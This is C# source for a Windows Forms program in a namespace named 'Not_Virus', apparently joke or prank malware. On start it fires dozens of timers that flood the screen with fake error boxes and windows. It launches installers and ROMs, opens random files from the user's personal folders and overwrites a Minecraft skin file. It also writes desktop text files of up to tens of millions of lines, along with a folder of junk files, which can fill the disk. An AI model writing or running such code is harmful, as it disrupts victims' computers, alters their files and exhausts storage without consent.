using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using static System.IO.FileSystemWatcher;
using System.IO;

namespace Not_Virus
{
    public partial class Form1 : Form
    {
        Random rnd = new Random();

        string[] funnyQuotes = { "a", "???", "test", "haha", "www", "question mark", "unfriending", "why rAndom people sign ined \n aaaaaaaaaaaaaaaaaaaaaa", "yay Your IP Hacking", "Why Apple Store7542 password hackinged", "cool and good", "everyone", "Who can Use BUP? (By Decree of SimpleFlips) \n Joel (Vinesauce) \n Markass \n Loohoo \n Markass \n Cassie (Half of a BUP per week.) \n Anyone that rents it ($5 per month)", "stonks", "epic", "nice", "cool", "wow", "aaaaaaaaa", "minecarft", "Those skinny supercomputers confer.", "ip hackmakenow", "OOF UPLOADED", "Made?", "Cloud is 6.6GB COMPLETED", "what is going on", "ok", "ok defeat time", "Not linear!", "YOU BARELY HACK MARIO", "I'm using tilt controls!", "時日月♡", "unfort", "UNBLOBK", "Other lang add and Google play apk upload pls", ":handshake:Deal", "Sticks and stones may break my bones, but words are merely the smallest element of language capable of containing meaning in isolation and as such can never directly produce the four thousand Newtons force per square centimeter required to break bones.", "That's like calling your peanut butter sandwich a not fast airplane.", "Hey, Vsauce! Micheal here.", "And as always, thanks for watching.", "Note If the internal function raises an error that can be handled before finishing then it will retry until it succeeds.", "U must copy and paste the ones from Unicode. Thingy", "things cannot stay cool and good forever", "reason : banned servers", "pls link", "you ip hacking web", "thog dont caare", "i mostly played the wii u version", "review = 5.0", "@Deleted User", "Apple Store7542荒らしだよ", "ok", "good?", "Fixed an issue that could cause Command Blocks to stop working unexpectedly", "End of Announcement", "coming soon", "That is art", "yay", "hi", "@deatg#4721", "cmfxmdjxgjhxvyxbwererewt45l43532", "Stage Select - Mega Man 3", "How do u make a account on Xbox live", "It’s Luigi’s rotation party, and you are not invited.", "Kup teraz!", "if I stop, how can I find an octagon?", "I have the world record on Bowser's Big Bean Burrito", "I hope no one looks at my plans while I'm sleeping.", "You need to wait before using the hero ability again!", "What's the deal with airline food?", "I'm a tire!", "to upload your photos and videos, visit upload.theweathernetwork.com", "GEX", "maybe it's the way you're dressed?", "You gotta do what?", "the pizza is aggressive", "why image delete", "Bill directs the 1812 overture.", "actually the crowbar snaps in two.", "Chateau Bowser", "nice >:]", "@deatg5 神", "this website is bad. im leaving forever", "no worthier easy", "WELCOME TO NINTENDO HOMEPAGE", "THEDRANK.COM", "POWERFUL WARIO GAME 2004", "the correct answer is…", "TXT: \"Donkey Kong guarding his treasure ches\"", "TEXTUAL INTEGRITY FAILURE DETECTED", "WARNING: SYNAX INEGRATION ERROR", "CANNO COMPLEE REQUES", "BUP", "luk a hat", "Stonks", "WELCOME TO THE WARP ZONE", "Welcome to die!", "Dabbing is rated E for everyone!", "Footballers are used to striking - thrown on an Alien is a nice sight", "X Brian Robot    ✓ Steven Velociraptor", "Best By 07 SEP 18 043 / 49", "100 perCENT SOUP", "Be careful around the fabric of reality, Garfield.", "Fidget Spinner installed✓", "AND MONSTER ARE NOTHARMONIUS", "I like da bonemeal", "I Have A Dire Need", ">>75481902    Sad", "quiz: error cannot start computer", "<helpers.converters.Pokemon object at 0x7f197a25c370>", "ak6n rsw;'a;e]1;''BAia7§4š“èÝÑo¼", "nice", "ok", "wow yes", "epic", "cool", "Minecraft Card Game?", "spong", "I.R.O.N.I.C.", "What do you think of EEK?", "Just heat and serve!", "RENT PAID", "Perhaps", "Can you find the paper clip?", "HOW DO I SHOT WEB", "What, you egg? [stabs him]", "It's Joke", "that was GOODE", "Special amiibo card included!", "New Funky Mode!", "Featuring Dante from the Devil May Cry Series", "The Game!", "The Movie!", "esophagus", "Unregistered Hypercam 2", "SUPER BROS. 5", "NOT FINLAND", "pneumonoultramicroscophicsilicavolcanoconiosis", "eef freef", "CUT BOAT", "*banjo stops*", "sherk", "notification regarding pre hosted conquests", "BONE BLOCK", "moose no toady", "SOUP III", "Deluxe!", "Melee", "Brawl", "Collector's Edition", "Ultimate Edition", "Licensed by Nintendo", "pick youre fighter", "Jojo reference", "It's been one of those days.", "victory is yours", "Time remaining: 9e+301", "time remaining: 300", "time remaining: 1", "tenor.gif", "SANS WAS IN THE YEARBOOK", "\"Yes.\"", "Parabola Earth", "The Luigi Archives", "Importing…", "achievement unlocked", "to recap:", "Toad in a Boat", "'string'", "BOB ESPONJA", "OVER THE OCEAN", "HE COMES", "what did you eat for dinner on 5/14?", "Now entering A: sans", "Do you know where you are?", "Not a virus!", "20 ways to kill Mario just kidding 10 ways to kill mario", "how to get pokeflute in soul silver", "Where's the juice?", "You can now play as Luigi.", "In a can!", "directors cut", "For Nintendo 3DS", "OH YEAH MR. KRABS", "If you find toad, email me and i'll give you a secret prize", "The computer is destroyed.", "email gun", "make away the words", "Win Mario's ultimate beach party!", "DRINK!", "The Sand: it is too sand", "it's a goddamn wonder bread!", "God is not a fidget spinner", "I forgot the MILK¡", "Super Video CD", "Modulate all eggs?", "Welcome to the New Simple Volume Wizard", "You need a Toad to open this Toad!", "hey have you guys wver played super mario what an awesome game", "we are dead for sure", "NOT TODAY", "Where’d my wood go?", "Cereal when no milk", "Lamp oil, rope, bombs? You want it? It’s yours my friend. As long as you have enough Rupees.", "I wonder what’s for dinner…", "DINNER BLASTER", "Only 1 percent can pass 5 stage!", "bgm01", "calm4.ogg", "creative7.ogg", "sans", "[please pretend this is the BASS TRACK]", "Please make house.", "door touch to bbbbbbbbb......", "Is it really over?", "Get out.", "Next question.", "Z's", "I do not control the speed at which lobsters die.", "How did this happen?", "How did we get here?", "Holy CG, look at the time.", "TREE WENT CRUNCH", "I'm really feeling it!", "That's not a fair question.", "Thank you for purchasing bot of deatg!", "house made", "aaaaaaaaaaaaaaaaaaaaaaaa", "NO bad wards", "yay deatg5 house found", "bot of deatg left the game", "Unable to connect to world", "Coming soon", "Coming soon to own on DVD and Video", "YOU ARE THE PRINCE OF TENNIS", "bot of deatg 2: Electric Boogaloo", "bot of deatg 3: the Pre-Sequel", "bot of deatg 4: the Return", "My work here is done.", "EXTREME DESERT BUS", "NEVER ORDER SPOOKY SPAGHETTI", "WAIT A MINUTE", "Here it is: My special attack.", "Oh man!", "Ultimate Battle", "Did you see that?", "🄱ANOS", "Deleting server...", "<bot of deatg> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "A wild pokémon has appeared! Guess the pokémon and type ccatch <pokémon> to catch it!", "あああああああああああああああああああああああああああああああああああ", "If this bot ain't good enough, i'll erase it.", "It will be here for some additional time.", "Finally! A game system for me!", "Actually the crowbar snaps in two.", "Just kidding!", "I honestly could not understand what you said just now.", "Who wants a bot of deatg at 3 in the morning?", "This is really unfunny. Please remove this bot from the server.", "If i had a dollar for every time someone visited my website, i'd have like, 3 dollars.", "(Snow Halation) plays)", "It is time to play Calculator", "", "I'm in space!", "ALL YOUR BASE ARE BELONG TO US", "\"BOT OF DEATG\" POSSESES GREAT RISKS AS WELL AS GREAT POSSIBILITIES.", "I need the hydrocarbons i'm looking for.", "CRC stands for Creamy Rigatoni Carbonara.", "BOT OF DEATG IS GOING TO BRAZIL", "You fool. You blongus. You absolute utter clampongus.", "Am I glad he's frozen in there and that we're out here.", "bot of deatg: collectors edition", "Not a virus!", "ALMOND ACTIVATED", "Toad very excited (with his legs showing)", "Definitely no hacking here", "This message is already nothing but a memory.", "Special amiibo card included!", "\"bot of deatg will not be in smash because he would be too OP.\"", "The entire Mega Man 3 soundtrack is a Jojo reference", "Not linear!", "$19 deatg.com gift card. And yes, I'm giving it away.", "ARMY SAYS HAS DISC", "I;m thinking about thos Beans", "Pls make bot of deatg", "Sorry has support ended Demfex Music", "Url click to auto Authentication", "Demfex tablet = Great", "VPN Valut:\n-super\n-proxy\n-old mobile hack mode lol" };

        public Form1()
        {
            InitializeComponent();
            BeginVirus();
        }

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

        public void BeginVirus()
        {
            timer1.Enabled  = true; //deatg site
            timer2.Enabled  = true; //error box
            timer3.Enabled  = true; //demfex login
            timer4.Enabled  = true; //balls
            timer5.Enabled  = true; //open any file
            timer6.Enabled  = true; //open minecraft
            timer7.Enabled  = true; //rickroll
            timer8.Enabled  = true; //deatg video
            timer9.Enabled  = true; //open apple store griefing
            timer10.Enabled = true; //install firefox
            //timer11.Enabled = true; //install discord
            timer12.Enabled = true; //install minecraft
            timer13.Enabled = true; //open pokemon rom
            timer14.Enabled = true; //moving pictures
            timer15.Enabled = true; //moving pictures from documents
            timer16.Enabled = true; //open resizing form
            timer17.Enabled = true; //open acapelladownloader
            timer18.Enabled = true; //open いろいろなブロックの家
            timer19.Enabled = true; //open the source code for this project
            //timer20.Enabled = true; //start asgaldh
            timer21.Enabled = true; //open random files from documents
            timer22.Enabled = true; //change windows theme
            timer23.Enabled = true; //ceate files on desktop
            timer24.Enabled = true; //create folder on desktop with a billion trillion files in it
            timer25.Enabled = true;

            timer1.Interval  = rnd.Next(4000, 50000);  //deatg site
            timer2.Interval  = rnd.Next(4000, 8000);   //error box
            timer3.Interval  = rnd.Next(30000, 90000); //demfex login
            timer4.Interval  = rnd.Next(2000, 30000);  //balls
            timer5.Interval  = rnd.Next(2000, 80000);  //open any file
            timer6.Interval  = rnd.Next(2000, 3000);   //open minecraft
            timer7.Interval  = rnd.Next(1, 3);         //rickroll
            timer8.Interval  = rnd.Next(2000, 10000);  //deatg video
            timer9.Interval  = rnd.Next(2000, 10000);  //open apple store griefing
            timer10.Interval = rnd.Next(2000, 10000);  //install firefox
            //timer11.Interval = rnd.Next(2000, 50000);  //install discord
            timer12.Interval = rnd.Next(2000, 50000);  //install minecraft
            timer13.Interval = rnd.Next(2000, 50000);  //open pokemon rom
            timer14.Interval = rnd.Next(2000, 18000);  //moving pictures
            timer15.Interval = rnd.Next(2000, 15000);  //moving pictures from documents
            timer16.Interval = rnd.Next(2000, 30000);  //open resizing form
            timer17.Interval = rnd.Next(2000, 30000);  //open acapelladownloader
            timer18.Interval = rnd.Next(2000, 50000);  //open いろいろなブロックの家
            timer19.Interval = rnd.Next(2000, 50000);  //open the source code for this project
            //timer20.Interval = rnd.Next(2000, 50000);  //start asgaldh
            timer21.Interval = rnd.Next(2000, 10000);  //open random files from documents
            timer22.Interval = rnd.Next(2000, 50000);  //change windows theme
            timer23.Interval = rnd.Next(2000, 10000);  //ceate files on desktop
            timer24.Interval = rnd.Next(2000, 10000);  //create folder on desktop with a billion trillion files in it
            timer25.Interval = rnd.Next(2000, 10000);
            ChangeMCSkin();
            ScrambleIntervals();
        }

        private void ScrambleIntervals()
        {
            timer1.Interval = rnd.Next(4000, 30000);   //deatg site
            timer2.Interval = rnd.Next(3000, 5000);    //error box
            timer3.Interval = rnd.Next(5000, 50000);   //demfex login
            timer4.Interval = rnd.Next(3000, 30000);   //balls
            timer5.Interval = rnd.Next(17000, 50000);   //open any file
            timer6.Interval = rnd.Next(4000, 50000);  //open minecraft
            timer7.Interval = rnd.Next(10000, 50000);  //rickroll
            timer8.Interval = rnd.Next(2000, 30000);   //deatg video
            timer9.Interval = rnd.Next(2000, 25000);   //open apple store griefing
            timer10.Interval = rnd.Next(2000, 60000);  //install firefox
            //timer11.Interval = rnd.Next(2000, 60000);  //install discord
            timer12.Interval = rnd.Next(5000, 60000);  //install minecraft
            timer13.Interval = rnd.Next(3000, 50000);  //open pokemon rom
            timer14.Interval = rnd.Next(1000, 30000);  //moving pictures
            timer15.Interval = rnd.Next(1000, 30000);  //moving pictures from documents
            timer16.Interval = rnd.Next(2000, 50000);  //open resizing form
            timer17.Interval = rnd.Next(2000, 50000);  //open acapelladownloader
            timer18.Interval = rnd.Next(2000, 50000);  //open いろいろなブロックの家
            timer19.Interval = rnd.Next(2000, 50000);  //open the source code for this project
            //timer20.Interval = rnd.Next(2000, 50000);  //start asgaldh
            timer21.Interval = rnd.Next(2000, 10000);  //open random files from documents
            timer22.Interval = rnd.Next(10000, 50000); //change windows theme
            timer23.Interval = rnd.Next(1000, 5000);  //ceate files on desktop
            timer24.Interval = rnd.Next(1000, 5000);  //create folder on desktop with a billion trillion files in it
            timer25.Interval = rnd.Next(2000, 20000);
        }

        private void ChangeMCSkin()
        {
            try
            {
                Process.Start("Rick Astley - Never Gonna Give You Up.mp3");

                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string fileName = "custom.png";
                string sourcePath = "";                              //wait a minute, will this folder have the same name on other PCs?
                string minecraftPath = userProfile + @"\AppData\Local\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe\LocalState\games\com.mojang";
                string skinPath = minecraftPath + @"\minecraftpe";

                string sourceFile = Path.Combine(sourcePath, fileName);
                string destFile = Path.Combine(skinPath, fileName);

                File.Copy(sourceFile, destFile, true);

                /* attempt to copy deatg pack to Minecraft folder
                string sourceFolder = "deatgpack";
                string resourcePacksFolder = minecraftPath + @"\resource_packs";

                //System.IO.Directory.Move(sourceFolder, resourcePacksFolder);
                */
            }
            catch { }


        }

        private void timer25_Tick(object sender, EventArgs e)
        {
            ScrambleIntervals();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            deatgWebsiteForm deatgWebsiteForm = new deatgWebsiteForm();
            deatgWebsiteForm.Show();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            string[] errorMessages = { "HTTP ERROR 400 (BAD REQUEST)", "You ducked up!", "HTTP ERROR 401 (UNAUTHORIZED)", "HTTP ERROR 403 (FORBIDDEN)", "HTTP ERROR 404 (NOT FOUND)", "HTTP ERROR 500 (INTERNAL SERVER ERROR)", "Can only save WORDS as ASCII", "Can't call other Tool", "Can't make folder as that's an existing filename", "Can't merge list", "Can't read file", "Character set reset to <x> to suit <language>", "Concordance file is faulty", "Concordance stop list file not found", "Conversion file not found", "Destination folder not found", "Disk problem: File not saved", "Dispersions go with concordances", "Drive not valid", "Failed to access Internet", "Failed to create new folder name", "File access denied", "File contains none of the tags specified", "File not found", "Filenames must differ!", "Full drive:\folder name needed", "function not working properly yet", "INI file not found", "Invalid Concordance file", "Invalid file name", "Invalid Keywords Database file", "Invalid Keywords file", "Invalid Wordlist Comparison file", "Invalid Wordlist file", "Joining limit reached: join & try again", "Key words file is faulty", "Keywords Database file is faulty", "Limit of 500 file-based search-words reached", "Links between Tools disrupted", "Match list details not specified", "Must be a number", "Network registration running elsewhere or vice-versa", "No access to text file: in use elsewhere?", "No associates found", "No clumps identified", "No clusters found", "No collocates found", "No concordance entries found", "No concordance stop list words", "No deleted lines to Zap", "No entries in Keywords Database", "No Key Words found", "No key words to plot", "No keyword stop list words", "No lemma list words", "No match list words", "No room for computed variable", "No statistics available", "No stop list words", "No such file(s) found", "No tag list words", "Not a valid number", "No wordlists selected", "Only X% of reference corpus words found", "Original text file needed but not found", "Registration string is not correct", "Registration string must be 20 letters long", "Short of Memory!", "Source Folder file(s) not found", "Stop list file not found", "Stop list file not read", "Tag file not found", "Tag list file not read", "This function is not yet ready!", "This is a demo version", "To stop getting this annoying message, Update from Demo in setup.exe", "Too many ignores (50 limit)", "Too many sentences (8000 limit)", "Two files needed", "Truncating at xx words -- tag list file has more!", "Unable to merge Keywords Databases", "Why did my search fail?", "Word list file not found", "Wordlist comparison file is faulty", "Word-list file is faulty", "Rgmd failed to read updated resource from the CCR on this node.", "Save a copy of the /var/adm/messages files on all nodes, and of the rgmd core file. Contact your authorized Sun service provider for assistance in diagnosing the problem." };
            MessageBox.Show(errorMessages[rnd.Next(0, errorMessages.Length)]);
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            DemfexLogin demfexLogin = new DemfexLogin();
            demfexLogin.Show();
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            Balls balls = new Balls();
            balls.Show();
        }

        private void timer5_Tick(object sender, EventArgs e)
        {
            OpenFileDialog openDialog = new OpenFileDialog();
            if (openDialog.ShowDialog() == DialogResult.OK)
            {
                Process process = Process.Start(openDialog.FileName);
                process.WaitForInputIdle();

                while (process.MainWindowHandle == IntPtr.Zero)
                {
                    Thread.Sleep(100);
                    process.Refresh();
                }
                SetParent(process.MainWindowHandle, Handle);
            }
        }

        private void timer6_Tick(object sender, EventArgs e)
        {
            Process.Start("deatg_pack.mcpack");
        }

        private void timer7_Tick(object sender, EventArgs e)
        {
           Process.Start("Rick Astley - Never Gonna Give You Up.mp3");
        }

        private void timer8_Tick(object sender, EventArgs e)
        {
            deatgVideo deatgVideo = new deatgVideo();
            deatgVideo.Show();
        }

        private void timer9_Tick(object sender, EventArgs e)
        {
            AppleStoreGrief AppleStoreGrief = new AppleStoreGrief();
            AppleStoreGrief.Show();
        }

        private void timer10_Tick(object sender, EventArgs e)
        {
            Process.Start("Firefox Installer.exe");
        }

        private void timer11_Tick(object sender, EventArgs e)
        {
            Process.Start("DiscordSetup.exe");
        }

        private void timer12_Tick(object sender, EventArgs e)
        {
            Process.Start("MinecraftInstaller.msi");
        }

        private void timer13_Tick(object sender, EventArgs e)
        {
            Process.Start("1636 - Pokemon Fire Red (U)(Squirrels).gba");
        }

        private void timer14_Tick(object sender, EventArgs e)
        {
            ImageMove imageMove = new ImageMove();
            imageMove.Show();
        }

        private void timer15_Tick(object sender, EventArgs e)
        {
            ImageMove2 imageMove2 = new ImageMove2();
            imageMove2.Show();
        }

        private void timer16_Tick(object sender, EventArgs e)
        {
            ResizingForm resizingForm = new ResizingForm();
            resizingForm.Show();
        }

        private void timer17_Tick(object sender, EventArgs e)
        {
            Process.Start("AcapellaDownloader.exe");
        }

        private void timer18_Tick(object sender, EventArgs e)
        {
            Process.Start("いろいろなブロックの家.fbx");
        }

        private void timer19_Tick(object sender, EventArgs e)
        {
            Process.Start("code.txt");
        }

        private void timer20_Tick(object sender, EventArgs e)
        {
            try { Process.Start("_asgaldh.EXE"); } catch { }
        }

        private void timer21_Tick(object sender, EventArgs e)
        {
            try
            {
                var documents = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "*.*");
                var pictures = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "*.*");
                var music = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "*.*");
                var desktop = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*");
                var videos = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), "*.*");

                List<string[]> locations = new List<string[]>();
                locations.Add(documents);
                locations.Add(pictures);
                locations.Add(music);
                locations.Add(desktop);
                locations.Add(videos);

                //<!-- LOOK AT THIS -->
                int selectedLocationIndex = rnd.Next(0, locations.Count);
                string[] selectedLocation = locations[selectedLocationIndex];
                int lengthOfSelectedLocation = locations[selectedLocationIndex].Length;
                string randomFile = selectedLocation[rnd.Next(0, lengthOfSelectedLocation)];
                try { Process.Start(randomFile); } catch { }
                //simplified (多分)
                //Process.Start(selectedLocation[rnd.Next(0, locations[selectedLocationIndex].Length)]);
            } catch
            {
                //lol fake catched
            }


        }

        private void timer22_Tick(object sender, EventArgs e)
        {
            try { Process.Start("aero.theme"); } catch { }
        }

        private void timer23_Tick(object sender, EventArgs e)
        {
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string filename = funnyQuotes[rnd.Next(0, funnyQuotes.Length)];
            //if unacceptable character in filename, just make the filename random
            try
            {
                StreamWriter streamWriter = new StreamWriter(desktop + @"\" + filename + ".txt");

                for (int i = 0; i < rnd.Next(700000, 75004035); i++)
                {
                    streamWriter.WriteLine(funnyQuotes[rnd.Next(0, funnyQuotes.Length)]);
                }
            } catch
            {
                StreamWriter streamWriter = new StreamWriter(desktop + @"\" + Path.GetRandomFileName() + ".txt");

                for (int i = 0; i < rnd.Next(700000, 75004035); i++)
                {
                    streamWriter.WriteLine(funnyQuotes[rnd.Next(0, funnyQuotes.Length)]);
                }
            }

            
        }

        private void timer24_Tick(object sender, EventArgs e)
        {
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            


            try
            {
                

                for (int i = 0; i < rnd.Next(7, 75); i++)
                {
                    Directory.CreateDirectory(desktop + @"\lol fake virus");
                    string filename = funnyQuotes[rnd.Next(0, funnyQuotes.Length)];
                    StreamWriter streamWriter = new StreamWriter(desktop + @"\lol fake virus\" + filename + ".txt");
                    for (int j = 0; j < rnd.Next(700, 7505); j++)
                    {
                        streamWriter.WriteLine(funnyQuotes[rnd.Next(0, funnyQuotes.Length)]);
                    }
                }
            }
            catch
            {
                StreamWriter streamWriter = new StreamWriter(desktop + @"\lol fake virus\" + Path.GetRandomFileName() + ".txt");

                for (int i = 0; i < rnd.Next(70, 75); i++)
                {
                    Directory.CreateDirectory(desktop + @"\lol fake virus");
                    StreamWriter streamWriter2 = new StreamWriter(desktop + @"\lol fake virus\" + Path.GetRandomFileName() + ".txt");
                    for (int j = 0; j < rnd.Next(700, 7505); j++)
                    {
                        streamWriter2.WriteLine(funnyQuotes[rnd.Next(0, funnyQuotes.Length)]);
                    }
                }
            }
        }
    }
}
